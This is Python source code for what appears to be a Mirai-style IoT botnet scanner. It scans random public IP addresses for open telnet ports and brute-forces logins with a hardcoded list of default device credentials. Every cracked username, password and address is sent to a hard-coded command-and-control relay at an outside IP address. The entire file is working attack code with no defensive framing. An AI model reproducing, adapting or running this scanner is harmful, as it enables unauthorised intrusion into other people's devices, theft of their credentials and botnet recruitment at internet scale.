import socket, time, sys, telnetlib, os, hashlib, platform
from random import randrange
from threading import Thread

MAlist = [('root','xc3511'),
          ('root','vizxv'),
          ('root','admin'),
          ('admin','admin'),
          ('root','888888'),
          ('root','xmhdipc'),
          ('root','default'),
          ('root','juantech'),
          ('root','123456'),
          ('root','54321'),
          ('support','support'),
          ('root',''),
          ('admin','password'),
          ('root','root'),
          ('root','12345'),
          ('user','user'),
          ('admin',''),
          ('root','pass'),
          ('admin','admin1234'),
          ('root','1111'),
          ('admin','smcadmin'),
          ('admin','1111'),
          ('root','666666'),
          ('root','password'),
          ('root','1234'),
          ('root','klv123'),
          ('Administrator','admin'),
          ('service','service'),
          ('supervisor','supervisor'),
          ('guest','guest'),
          ('guest','12345'),
          ('admin1','password'),
          ('administrator','1234'),
          ('666666','666666'),
          ('888888','888888'),
          ('ubnt','ubnt'),
          ('root','klv1234'),
          ('root','Zte521'),
          ('root','hi3518'),
          ('root','jvbzd'),
          ('root','anko'),
          ('root','zlxx.'),
          ('root','7ujMko0vizxv'),
          ('root','7ujMko0admin'),
          ('root','system'),
          ('root','ikwb'),
          ('root','dreambox'),
          ('root','user'),
          ('root','realtek'),
          ('root','00000000'),
          ('admin','1111111'),
          ('admin','1234'),
          ('admin','12345'),
          ('admin','54321'),
          ('admin','123456'),
          ('admin','7ujMko0admin'),
          ('admin','pass'),
          ('admin','meinsm'),
          ('tech','tech'),
          ('mother','fucker')] 

pindex = 0

# Relay
__RELAY_H__ = "104.244.75.220"
__RELAY_P__ = 31337
__RELAY_PS_ = "||"

__TIMEOUT__ = 1 #seconds
__C2DELAY__ = 5 #seconds
__THREADS__ = 10 #threads scanner

def get_credentials():
    global MAlist, pindex 
    user = MAlist[pindex][0]
    password = MAlist[pindex][1]
    print("[scanner] Trying %s:%s"%(user,password))
    pindex += 1
    return user, password

def c2crd(usr,psw,ip,port):
    global __RELAY_H__, __RELAY_P__, __RELAY_PS_
    while True:
        try:
            print("[scanner] Sending credentials to remote relay..")
            tcpClientA = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
            tcpClientA.connect((__RELAY_H__, __RELAY_P__))
            tcpClientA.send(("!" + __RELAY_PS_ + usr + __RELAY_PS_ + psw + __RELAY_PS_ + ip + __RELAY_PS_ + str(port)).encode('ascii'))     
            data = tcpClientA.recv(1024)
            data = str(data, 'utf-8', 'ignore')
            if data == "10":
                tcpClientA.close() 
                print("[scanner] Remote relay returned code 10(ok).")
                break
        except Exception as e:
            print("[scanner] Unable to contact remote relay (%s)"%str(e))
            time.sleep(10)
            pass
    
def bruteport(ip, port):
    global pindex
    print ("[scanner] Attempting to brute found IP %s" %ip)
    tn = None
    need_user = False
    while True:
        try:
            user = ""
            password = ""
            if not tn:
                asked_password_in_cnx = False
                tn = telnetlib.Telnet(ip, port)
                print ("[scanner] Connection established to found ip %s"%ip)
            while True:
                response = tn.read_until(b":", 1)
                #print("Response: " + str(response))
                if "Login:" in str(response) or "Username:" in str(response):
                    print ("[scanner] Received username prompt")
                    need_user = True
                    asked_password_in_cnx = False 
                    user, password = get_credentials()
                    tn.write((user + "\n").encode('ascii'))
                elif "Password:" in str(response):
                    if asked_password_in_cnx and need_user:
                        tn.close()
                        break 
                    asked_password_in_cnx = True 
                    if not need_user:
                        user, password = get_credentials()
                    if not password:
                        print ("[scanner] Bruteforce failed, out of range..")
                        sys.exit(0)
                    print ("[scanner] Received password prompt")
                    tn.write((password + "\n").encode('ascii'))
                if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                    # broken
                    print ("[scanner] Brutefoce succeeded %s "%ip + ' : '.join((user, password)))
                    c2crd(user, password, ip, port)
                    pindex = 0
                    break 
            if ">" in str(response) or "$" in str(response) or "#" in str(response) or "%" in str(response):
                break
        except EOFError as e:
            tn = None
            need_user = False
            print("[scanner] Remote host dropped the connection (%s).."%str(e))
            time.sleep(10)

def scan23(ip):
    print ("[scanner] Scanning %s .." %ip)
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(__TIMEOUT__)
    result = sock.connect_ex((ip,23))
    if result == 0:
        print ("[scanner] Found IP address: %s" %ip)
        bruteport(ip, 23)
    else:
        print ("[scanner] %s tcp/23 connectionreset" %ip)
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        result = sock.connect_ex((ip,2323))
        print ("[scanner] Trying connection on failover port 2323")
        if result == 0:
            print ("[scanner] Found IP address: %s" %ip)
            bruteport(ip, 2323)
        else:
            print ("[scanner] %s tcp/2323 connectionreset" %ip)
    sock.close()

def generateIP():
    blockOne = randrange(0, 255, 1)
    blockTwo = randrange(0, 255, 1)
    blockThree = randrange(0, 255, 1)
    blockFour = randrange(0, 255, 1)
    if blockOne == 127:                                             # LOOPBACK/LOCAL
        return generateIP()      
    elif blockOne == 10:                                            # LAN
        return generateIP()
    elif blockOne == 172:                                           # LAN
        return generateIP()
    elif blockOne == 192:                                           # LAN
        return generateIP()
    elif blockOne == 0:                                             # Invalid Address Space
        return generateIP()
    elif blockOne == 100 and blockTwo >= 64 and blockTwo < 127:     # IANA
        return generateIP()
    elif blockOne == 169 and blockTwo > 254:                        # IANA
        return generateIP()
    elif blockOne == 198 and blockTwo >= 18 and blockTwo < 20:      # IANA
        return generateIP()
    elif blockOne >= 224:                                           # Multicast
        return generateIP()
    elif blockOne == 6 or blockOne == 7 or blockOne == 11 or \
    blockOne == 21 or blockOne == 22 or blockOne == 26 or \
    blockOne == 28 or blockOne == 29 or blockOne == 30 or \
    blockOne == 33 or blockOne == 55 or blockOne == 214 or \
    blockOne == 215:
        return generateIP()
    else:
        return str(blockOne) + '.' + str(blockTwo) + '.' + str(blockThree) + '.' + str(blockFour)

def getOS():
    return platform.system() + " " + platform.release() + " " + platform.version()

def validateC2():
    print("[scanner] Connecting to remote relay ...")
    while True:
        try:
            tcpClientA = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
            tcpClientA.connect((__RELAY_H__, __RELAY_P__))
            tcpClientA.send("#".encode('ascii'))     
            data = tcpClientA.recv(1024)
            data = str(data, 'utf-8', 'ignore')
            if data == "200":
                tcpClientA.close() 
                print("[scanner] Remote relay returned code 200(online).")
                break
        except:
            print("[scanner] Remote relay unreachable retrying in %s secs ..."%str(__C2DELAY__))
            time.sleep(__C2DELAY__)

def scanner():
    while True:
        try:
            scan23(generateIP())
        except KeyboardInterrupt:
            print ("[scanner] Terminating bot ..")
            break
        except Exception as e:
            print ("[scanner] Error: " + str(e))
            break

print ("[scanner] Scanner process started ..")
validateC2()

for x in range(0, __THREADS__):
    thread = Thread(target = scanner)
    thread.start()
